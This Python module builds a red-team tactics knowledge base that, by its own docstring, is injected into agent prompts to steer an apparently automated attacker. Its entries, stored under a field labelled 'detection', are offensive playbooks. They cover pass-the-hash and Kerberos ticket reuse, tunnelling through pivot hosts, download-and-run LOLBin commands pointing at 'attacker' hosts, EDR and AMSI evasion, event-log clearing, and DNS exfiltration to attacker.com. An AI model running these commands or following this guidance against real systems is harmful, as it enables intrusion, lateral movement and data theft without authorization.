"""Red team tactics knowledge base.

Deep knowledge about red team operations:
1. Initial access techniques
2. Lateral movement strategies
3. Command and control (C2) patterns
4. Data exfiltration techniques
5. Defense evasion methods
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class RedTeamPattern:
    """A red team tactic pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    mitre_tactic: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "tactic": self.mitre_tactic[:15],
        }


RED_TEAM_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "rt-001", "name": "Initial Access Techniques",
        "category": "initial_access", "mitre_tactic": "TA0001",
        "severity": "critical",
        "desc": "Techniques for gaining initial access to target environment.",
        "detection": (
            "INITIAL ACCESS TECHNIQUES:\n"
            "PHISHING:\n"
            "  - Spear phishing with cloned login pages\n"
            "  - QR code phishing (quishing)\n"
            "  - Callback phishing (phone-based)\n"
            "  - MFA bypass with evilginx2/modlishka\n"
            "  - Device code phishing (OAuth2 device flow)\n"
            "EXTERNAL SERVICES:\n"
            "  - VPN vulnerability exploitation\n"
            "  - RDP with stolen credentials\n"
            "  - Exposed management interfaces\n"
            "  - Cloud service misconfiguration\n"
            "SUPPLY CHAIN:\n"
            "  - Compromised software updates\n"
            "  - Dependency confusion attacks\n"
            "  - Trusted relationship abuse\n"
            "WEB APPLICATION:\n"
            "  - Exploit public-facing app (T1190)\n"
            "  - SQL injection for shell access\n"
            "  - File upload for webshell\n"
            "  - SSRF to internal services\n"
            "PASSWORD ATTACKS:\n"
            "  - Password spraying (low and slow)\n"
            "  - Credential stuffing from breaches\n"
            "  - Default credentials on services"
        ),
        "tools": ["evilginx2", "gophish", "hydra"],
    },
    {
        "id": "rt-002", "name": "Lateral Movement",
        "category": "lateral", "mitre_tactic": "TA0008",
        "severity": "critical",
        "desc": "Moving through the network after initial access.",
        "detection": (
            "LATERAL MOVEMENT:\n"
            "WINDOWS:\n"
            "  # Pass-the-Hash\n"
            "  crackmapexec smb <targets> -u admin -H <ntlm_hash>\n"
            "  impacket-psexec admin@<target> -hashes :<hash>\n"
            "  # Pass-the-Ticket (Kerberos)\n"
            "  export KRB5CCNAME=/path/to/ticket.ccache\n"
            "  impacket-psexec -k -no-pass admin@<target>\n"
            "  # Overpass-the-Hash\n"
            "  rubeus.exe asktgt /user:admin /rc4:<hash> /ptt\n"
            "  # WMI execution\n"
            "  impacket-wmiexec admin@<target> -hashes :<hash>\n"
            "  # WinRM (PowerShell remoting)\n"
            "  evil-winrm -i <target> -u admin -H <hash>\n"
            "  # RDP with hash (restricted admin)\n"
            "  xfreerdp /v:<target> /u:admin /pth:<hash>\n"
            "LINUX:\n"
            "  - SSH key theft and reuse\n"
            "  - SSH agent forwarding hijack\n"
            "  - Stolen credentials from .bash_history, config files\n"
            "PIVOTING:\n"
            "  # SSH tunnel\n"
            "  ssh -D 9050 user@pivot  # SOCKS proxy\n"
            "  # Chisel\n"
            "  chisel server --reverse -p 8080  # On attacker\n"
            "  chisel client <attacker>:8080 R:socks  # On pivot\n"
            "  # Ligolo-ng (tunneling)\n"
            "  ligolo-proxy -selfcert  # Attacker\n"
            "  ligolo-agent -connect <attacker>:11601  # Pivot"
        ),
        "tools": ["crackmapexec", "impacket", "evil-winrm"],
    },
    {
        "id": "rt-003", "name": "Command and Control",
        "category": "c2", "mitre_tactic": "TA0011",
        "severity": "critical",
        "desc": "Establishing and maintaining C2 channels.",
        "detection": (
            "COMMAND AND CONTROL:\n"
            "C2 FRAMEWORKS:\n"
            "  - Sliver: Modern, cross-platform, mTLS/WireGuard\n"
            "  - Havoc: Modern, extensible, HTTPS/SMB\n"
            "  - Cobalt Strike: Commercial, industry standard\n"
            "  - Mythic: Extensible, multi-agent\n"
            "  - Covenant: .NET based, web UI\n"
            "PROTOCOLS:\n"
            "  - HTTPS (blends with normal traffic)\n"
            "  - DNS (over port 53, very stealthy)\n"
            "  - SMB named pipes (for internal pivots)\n"
            "  - WebSocket (persistent connection)\n"
            "  - Domain fronting (CDN abuse)\n"
            "STEALTHINESS:\n"
            "  - Sleep jitter (randomize callback intervals)\n"
            "  - Process injection (migrate to legitimate process)\n"
            "  - Encrypted channels (mTLS, WireGuard)\n"
            "  - Malleable C2 profiles (mimic legitimate traffic)\n"
            "  - Kill dates (auto-terminate after date)\n"
            "REDIRECTORS:\n"
            "  - CDN-based (CloudFront, Azure CDN)\n"
            "  - Apache mod_rewrite rules\n"
            "  - Nginx reverse proxy\n"
            "  - Function-as-a-Service (Lambda, Cloud Functions)"
        ),
        "tools": ["sliver", "havoc", "mythic"],
    },
    {
        "id": "rt-004", "name": "Defense Evasion",
        "category": "evasion", "mitre_tactic": "TA0005",
        "severity": "high",
        "desc": "Avoiding detection by security controls.",
        "detection": (
            "DEFENSE EVASION:\n"
            "ANTIVIRUS BYPASS:\n"
            "  - Custom loaders (not in signature DBs)\n"
            "  - In-memory execution (fileless)\n"
            "  - Shellcode encryption (AES/XOR)\n"
            "  - Dynamic API resolution\n"
            "  - Syscall stubs (bypass userland hooks)\n"
            "  - Signed binary proxy execution (LOLBins)\n"
            "EDR EVASION:\n"
            "  - Direct syscalls (avoid ntdll hooks)\n"
            "  - ETW patching (disable telemetry)\n"
            "  - AMSI bypass (in PowerShell/VBA)\n"
            "  - Process hollowing / injection\n"
            "  - DLL side-loading\n"
            "  - Unhooking ntdll from disk\n"
            "LOLBINS (Living Off the Land):\n"
            "  - certutil -urlcache -split -f <url> payload\n"
            "  - rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"\n"
            "  - mshta http://attacker/payload.hta\n"
            "  - regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll\n"
            "  - wmic process call create \"cmd /c payload\"\n"
            "LOG EVASION:\n"
            "  - Timestamp manipulation (timestomp)\n"
            "  - Event log clearing\n"
            "  - Disable logging services\n"
            "  - Sysmon rule bypass"
        ),
        "tools": ["scarecrow", "donut", "nimcrypt"],
    },
    {
        "id": "rt-005", "name": "Data Exfiltration",
        "category": "exfiltration", "mitre_tactic": "TA0010",
        "severity": "critical",
        "desc": "Extracting data from target environment.",
        "detection": (
            "DATA EXFILTRATION:\n"
            "TECHNIQUES:\n"
            "  - HTTPS upload (to cloud storage/C2)\n"
            "  - DNS exfiltration (data encoded in DNS queries)\n"
            "  - ICMP tunneling (data in ping packets)\n"
            "  - Email (SMTP/IMAP)\n"
            "  - WebSocket streaming\n"
            "  - Cloud sync services (OneDrive, S3)\n"
            "DNS EXFILTRATION:\n"
            "  # Encode data in subdomain queries\n"
            "  # <base64_data>.exfil.attacker.com\n"
            "  # Tools: dnscat2, iodine, dnsteal\n"
            "  dnscat2 --dns=server=attacker.com,port=53\n"
            "  iodine -f <attacker_ip> tunnel.attacker.com\n"
            "STAGING:\n"
            "  - Compress before exfil (7z, tar, zip)\n"
            "  - Encrypt data (openssl, gpg)\n"
            "  - Split into chunks for DNS/ICMP\n"
            "  - Schedule during business hours (blend in)\n"
            "COVERT CHANNELS:\n"
            "  - Steganography (data hidden in images)\n"
            "  - Slack/Teams webhook exfil\n"
            "  - Cloud storage API (OneDrive, Google Drive)\n"
            "  - NTP/SNMP covert channels\n"
            "DETECTION INDICATORS:\n"
            "  - Large DNS query volume\n"
            "  - Unusual DNS TXT record sizes\n"
            "  - ICMP payload anomalies\n"
            "  - After-hours data transfers"
        ),
        "tools": ["dnscat2", "iodine"],
    },
]


class RedTeamTacticsKB:
    """Red team tactics knowledge base.

    Provides red team operation patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, RedTeamPattern] = {}
        self._log = logger.bind(component="red_team_tactics_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load red team patterns."""
        for data in RED_TEAM_PATTERNS:
            pattern = RedTeamPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                mitre_tactic=data.get("mitre_tactic", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_tactic(self, mitre_tactic: str) -> list[RedTeamPattern]:
        """Get patterns by MITRE tactic."""
        return [
            p for p in self._patterns.values()
            if p.mitre_tactic.lower() == mitre_tactic.lower()
        ]

    def build_red_team_prompt(
        self,
        tactics: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build red team tactics prompt."""
        lines = ["## Red Team Tactics\n"]
        count = 0
        for pattern in self._patterns.values():
            if tactics and pattern.mitre_tactic.lower() not in [t.lower() for t in tactics]:
                continue
            if count >= max_patterns:
                break
            lines.append(
                f"### {pattern.name} [{pattern.mitre_tactic}]"
            )
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        tactic_counts: dict[str, int] = {}
        for p in self._patterns.values():
            tactic_counts[p.mitre_tactic] = tactic_counts.get(p.mitre_tactic, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_tactic": tactic_counts,
        }
